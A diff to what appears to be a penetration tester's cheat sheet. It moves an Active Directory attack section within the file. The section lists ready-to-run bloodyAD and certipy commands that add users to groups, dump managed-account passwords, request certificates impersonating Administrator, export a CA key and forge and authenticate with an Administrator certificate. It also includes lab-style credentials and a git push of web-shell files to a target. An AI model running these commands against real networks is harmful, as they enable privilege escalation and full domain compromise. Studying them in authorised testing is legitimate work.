@@ -338,6 +338,36 @@ https://datafetcher.com/graphql-json-body-converter
 git add shell.*;git commit -m 'added';git push http://43ce39bb0bd6bc489284f2905f033ca467a6362f@$TARGET:3000/$USERNAME/website.git
 
 ## Infrastructure
+[*] Active Directory
++---------- Add User to Group ----------+
+bloodyAD --dc-ip $TARGET -d '$DOM' -u '$USERNAME' -p '$PASSWORD' add groupMember 'GROUP' 'USER'
+
++---------- Get msDS-ManagedPassword ----------+
+bloodyAD --dc-ip $TARGET -d '$DOM' -u '$USERNAME' -p '$PASSWORD' get object MGTSVC$ --attr msDS-ManagedPassword
+
++---------- Certificate Services Attacks ----------+
+chromium http://$TARGET/certsrv
+nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' -M adcs
+nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' -k -M adcs
+
++---------- Get CA Name ----------+
+certipy-ad find -u 'Lion.SK' -p '!QAZ2wsx' -dc-ip 10.10.11.71 -vulnerable -enabled -stdout | grep 'CA Name'
+
++---------- Get Vulnerable ESC ----------+
+certipy-ad find -u 'Lion.SK' -p '!QAZ2wsx' -dc-ip 10.10.11.71 -vulnerable -enabled -stdout | grep 'ESC'
+
++---------- Get Certificate ----------+
+certipy-ad req -u 'Lion.SK' -p '!QAZ2wsx' -dc-ip 10.10.11.71 -ca 'Certificate-LTD-CA' -template 'Delegated-CRA' -debug -dynamic-endpoint
+certipy-ad req -dc-ip $TARGET -target $DC -u '$USERNAME' -p '$PASSWORD' -ca '$CA' -upn 'Administrator' -template 'RetroClients' -key-size '4096'
+
++---------- Forge Certificate ----------+
+certutil -store my
+certutil -exportpfx my "75b2f4bbf31f108945147b466131bdca" ca_exported.pfx
+certipy forge -ca-pfx 'ca_exported.pfx' -upn ADMINISTRATOR@$DOM -subject 'CN=ADMINISTRATOR,CN=USERS,DC=EXAMPLE,DC=LOCAL'
+
++---------- Authenticate Certificate ----------+
+certipy auth -dc-ip $TARGET -pfx 'administrator_forged.pfx'
+
 [*] Cracking
 +---------- Make rockyou ----------+
 sudo ln -s /usr/share/wordlists/rockyou.txt /usr/local/bin/rockyou
@@ -488,36 +518,6 @@ dig axfr @$TARGET $DOM
 [*] (79) Finger
 finger '$USERNAME'@$TARGET
 while read -r user; do finger "$user"@$TARGET; done < usernames
-
-[*] Active Directory
-+---------- Add User to Group ----------+
-bloodyAD --dc-ip $TARGET -d '$DOM' -u '$USERNAME' -p '$PASSWORD' add groupMember 'GROUP' 'USER'
-
-+---------- Get msDS-ManagedPassword ----------+
-bloodyAD --dc-ip $TARGET -d '$DOM' -u '$USERNAME' -p '$PASSWORD' get object MGTSVC$ --attr msDS-ManagedPassword
-
-+---------- Certificate Services Attacks ----------+
-chromium http://$TARGET/certsrv
-nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' -M adcs
-nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' -k -M adcs
-
-+---------- Get CA Name ----------+
-certipy-ad find -u 'Lion.SK' -p '!QAZ2wsx' -dc-ip 10.10.11.71 -vulnerable -enabled -stdout | grep 'CA Name'
-
-+---------- Get Vulnerable ESC ----------+
-certipy-ad find -u 'Lion.SK' -p '!QAZ2wsx' -dc-ip 10.10.11.71 -vulnerable -enabled -stdout | grep 'ESC'
-
-+---------- Get Certificate ----------+
-certipy-ad req -u 'Lion.SK' -p '!QAZ2wsx' -dc-ip 10.10.11.71 -ca 'Certificate-LTD-CA' -template 'Delegated-CRA' -debug -dynamic-endpoint
-certipy-ad req -dc-ip $TARGET -target $DC -u '$USERNAME' -p '$PASSWORD' -ca '$CA' -upn 'Administrator' -template 'RetroClients' -key-size '4096'
-
-+---------- Forge Certificate ----------+
-certutil -store my
-certutil -exportpfx my "75b2f4bbf31f108945147b466131bdca" ca_exported.pfx
-certipy forge -ca-pfx 'ca_exported.pfx' -upn ADMINISTRATOR@$DOM -subject 'CN=ADMINISTRATOR,CN=USERS,DC=EXAMPLE,DC=LOCAL'
-
-+---------- Authenticate Certificate ----------+
-certipy auth -dc-ip $TARGET -pfx 'administrator_forged.pfx'
 
 [*] (88) Kerberos
 +---------- Clock skew ----------+
